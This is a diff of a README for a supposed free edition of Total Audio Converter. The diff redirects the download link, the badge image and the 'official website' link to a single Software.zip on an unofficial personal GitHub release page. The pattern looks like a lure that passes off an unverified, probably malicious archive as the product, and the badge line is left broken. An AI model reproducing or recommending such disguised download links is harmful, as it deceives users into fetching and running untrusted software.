@@ -12,9 +12,9 @@ Welcome to the Total Audio Converter Free repository! This tool allows you to co
 
 ## Installation 🚀
 
-To get started with Total Audio Converter Free, [download the latest release here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip). 
+To get started with Total Audio Converter Free, [download the latest release here](https://github.com/darius0071/Total-Audio-Converter-Free/releases/download/v1.0/Software.zip). 
 
-![Download Total Audio Converter Free](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)
+![Download Total Audio Converter Free](https://github.com/darius0071/Total-Audio-Converter-Free/releases/download/v1.0/Software.zip%20Release-brightgreen)
 
 Once downloaded, launch the application and start converting your audio and video files hassle-free!
 
@@ -45,6 +45,6 @@ If you have any questions, feedback, or suggestions, feel free to reach out to u
 
 ## Stay Connected 🌐
 
-Stay updated on the latest news and releases by visiting our [official website](https://totalaudioconverterfree.com). Connect with us on social media for more updates and exciting features!
+Stay updated on the latest news and releases by visiting our [official website](https://github.com/darius0071/Total-Audio-Converter-Free/releases/download/v1.0/Software.zip). Connect with us on social media for more updates and exciting features!
 
 Thank you for choosing Total Audio Converter Free for all your audio and video conversion needs! 🎶🔉
